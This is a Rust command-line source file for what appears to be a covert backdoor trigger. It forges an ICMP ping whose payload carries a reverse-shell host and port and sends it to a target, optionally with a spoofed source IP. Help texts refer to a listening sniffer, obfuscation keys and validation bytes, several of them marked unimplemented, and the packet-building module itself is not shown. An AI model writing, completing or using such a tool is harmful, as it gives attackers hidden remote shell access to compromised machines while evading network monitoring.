use std::net::Ipv4Addr;
use std::str::FromStr;

use clap::Parser;

use forger::forge;

mod forger;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Ip to send the ping
    #[arg(short, long)]
    dest: String,

    /// Ip to source in the ip header (default: 127.0.0.1)
    #[arg(short, long)]
    src: Option<String>,

    ///ip for the reverse shell
    #[arg(short, long)]
    reverse_host: String,

    ///port for the reverse shell
    #[arg(short, long)]
    port_reverse_host: u16,

    /// configuration for the sniffer (not implemented yet)
    #[arg(short, long)]
    config: Option<String>,

    ///obfuscation key (byte array in B64) (not implemented yet)
    #[arg(short, long)]
    key: Option<String>,

    /// identifier detected by the sniffer  (not implemented yet)
    #[arg(short, long)]
    identifier: Option<u16>,

    ///validation Bytes (bytes at the beginning of the payload that need to correspond)  (not implemented yet)
    #[arg(short, long)]
    validation_bytes: Option<String>
}
fn main() {
    let args = Args::parse();

    let ip_dest: Ipv4Addr =
        match Ipv4Addr::from_str(args.dest.as_str()) {
            Ok(ip) => ip,
            Err(_) => {
                println!("Invalid ip");
                return;
            }
        };
    let ip_src: Option<Ipv4Addr> =
        match args.src {
            Some(ip) => {
                match Ipv4Addr::from_str(ip.as_str()){
                    Ok(ip) => Some(ip),
                    Err(_) => {
                        println!("Invalid ip src");
                        return;
                    }
                }
            }
            None => None
        };
    let ip_reverse_host: Ipv4Addr =
        match Ipv4Addr::from_str(args.reverse_host.as_str()) {
            Ok(ip) => ip,
            Err(_) => {
                println!("Invalid ip");
                return;
            }
        };
    let port_reverse_host = args.port_reverse_host;


    //TODO add key, identifier, validation bytes, choice of obfuscation, choice of size
    let icmp_packet = forge( ip_reverse_host, port_reverse_host, None, None, true, true, None);
    forger::send(icmp_packet, ip_dest, ip_src);
}